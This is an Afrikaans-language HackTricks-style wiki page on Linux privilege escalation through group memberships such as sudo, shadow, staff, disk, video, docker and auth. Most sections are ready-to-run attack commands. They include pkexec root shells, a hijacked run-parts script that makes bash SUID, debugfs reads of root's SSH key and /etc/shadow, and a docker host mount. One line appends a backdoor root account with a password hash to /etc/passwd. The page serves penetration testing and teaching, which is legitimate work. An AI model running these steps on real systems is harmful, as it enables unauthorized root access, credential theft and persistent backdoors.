# Interessante Groepe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groepe

### **PE - Method 1**

**Soms**, **standaard (of omdat sekere sagteware dit benodig)** binne die **/etc/sudoers**-lêer kan jy 'n paar van hierdie reëls vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep sudo of admin behoort, alles as sudo kan uitvoer**.

As dit die geval is, **om root te word kan jy net uitvoer**:
```
sudo su
```
### PE - Method 2

Soek alle suid binaries en kyk of die binary **Pkexec** bestaan:
```bash
find / -perm -4000 2>/dev/null
```
Indien jy vind dat die binaire **pkexec is a SUID binary** en jy behoort tot **sudo** of **admin**, kan jy waarskynlik binaire as sudo uitvoer met `pkexec`.\
Dit is omdat tipies dit die groepe binne die **polkit policy** is. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer, en **standaard** verskyn in sommige linux distros die groepe **sudo** en **admin**.

Om **root te word**, kan jy uitvoer:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie permissies het nie, maar omdat jy nie sonder 'n GUI gekoppel is nie**. En daar is 'n ompad vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh-sessies** nodig:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Soms**, **standaard** in die **/etc/sudoers** lêer kan jy hierdie lyn vind:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep wheel behoort enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net die volgende uitvoer**:
```
sudo su
```
## Shadow Group

Gebruikers van die **group shadow** kan die **/etc/shadow** lêer lees:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Lees die lêer en probeer om **crack some hashes**.

Quick lock-state nuance when triaging hashes:
- Inskrywings met `!` of `*` is oor die algemeen nie-interaktief vir wagwoord-aanmeldings.
- `!hash` beteken gewoonlik dat 'n wagwoord gestel en daarna gesluit is.
- `*` beteken gewoonlik dat nooit 'n geldige wagwoord-hash gestel is nie.
Dit is nuttig vir rekeningklassifikasie selfs wanneer direkte aanmelding geblokkeer is.

## Personeelgroep

**staff**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) by te voeg sonder om root-privileges te benodig (let daarop dat uitvoerbare lêers in `/usr/local/bin` in die PATH-veranderlike van enige gebruiker is, en hulle kan die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam oorskryf). Vergelyk met groep "adm", wat meer verband hou met monitering/sekuriteit. [\[source\]](https://wiki.debian.org/SystemGroups)

In Debian-verspreidings toon die `$PATH`-veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, ongeag of jy 'n gemagtigde gebruiker is of nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As ons sekere programme in `/usr/local` kan kaap, kan ons maklik root kry.

Om die `run-parts`-program te kaap is 'n maklike manier om root te kry, omdat die meeste programme `run-parts` sal uitvoer, soos crontab of tydens 'n ssh-aanmelding.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
of wanneer 'n nuwe ssh-sessie login.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Skyfgroep

Hierdie voorreg is byna **gelykstaande aan root access**, aangesien jy toegang tot al die data op die masjien het.

Lêers:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let wel dat deur debugfs te gebruik jy ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy dit so doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
As jy egter probeer **lêers te skryf wat aan root behoort** (soos `/etc/shadow` of `/etc/passwd`) sal jy 'n "**Permission denied**" fout kry.

## Video Group

Met die opdrag `w` kan jy bepaal **wie op die stelsel aangemeld is** en dit sal 'n uitvoer soos die volgende toon:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies by 'n terminal op die masjien aangemeld is**.

Die **video group** het toegang om die skermuitset te besigtig. Basies kan jy die skerms bekyk. Om dit te doen moet jy die **vang die huidige beeld op die skerm** as rou data en die resolusie bepaal wat die skerm gebruik. Skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **ruwe beeld** oop te maak kan jy **GIMP** gebruik, kies die **`screen.raw`** lêer en stel as lêertipe **Raw image data**:

![](<../../../images/image (463).png>)

Stel dan die Width en Height in op die waardes wat op die skerm gebruik is en kyk na verskillende Image Types (en kies die een wat die skerm die beste vertoon):

![](<../../../images/image (317).png>)

## Root Groep

Dit lyk asof standaard **lede van die root-groep** toegang kan hê om sekere **service** konfigurasielêers of sekere **libraries**-lêers of **ander interessante dinge** te **wysig** wat gebruik kan word om voorregte te eskaleer...

**Kontroleer watter lêers root-lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Jy kan **die root-lêerstelsel van die host-masjien op 'n instance se volume mount**, sodat wanneer die instance begin dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief root op die masjien.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Laastens, as jy nie van enige van die vorige voorstelle hou nie, of hulle om een of ander rede nie werk nie (docker api firewall?), kan jy altyd probeer om **run a privileged container and escape from it** soos hier verduidelik:

{{#ref}}
../container-security/
{{#endref}}

As jy skryfpermissies oor die docker socket het lees [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Groep

{{#ref}}
./
{{#endref}}

## Adm Groep

Gewoonlik het **members** van die groep **`adm`** permissies om **read log** lêers wat binne _/var/log/_ geleë is te lees.\
Daarom, as jy 'n gebruiker binne hierdie groep gekompromitteer het, moet jy beslis 'n **look to the logs** neem.

## Backup / Operator / lp / Mail groepe

Hierdie groepe is dikwels **credential-discovery** vektore eerder as direkte root-vektore:
- **backup**: kan argiewe met configs, keys, DB dumps, of tokens blootstel.
- **operator**: platform-spesifieke operasionele toegang wat sensitiewe runtime-data kan leak.
- **lp**: print queues/spools kan dokumentinhoud bevat.
- **mail**: mail spools kan reset links, OTPs, en internal credentials blootstel.

Behandel lidmaatskap hier as 'n hoë-waarde data exposure bevinding en pivot deur password/token reuse.

## Auth Groep

In OpenBSD kan die **auth** groep gewoonlik skryf in die vouers _**/etc/skey**_ en _**/var/db/yubikey**_ indien hulle gebruik word.\
Hierdie permissies kan misbruik word met die volgende exploit om **escalate privileges** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
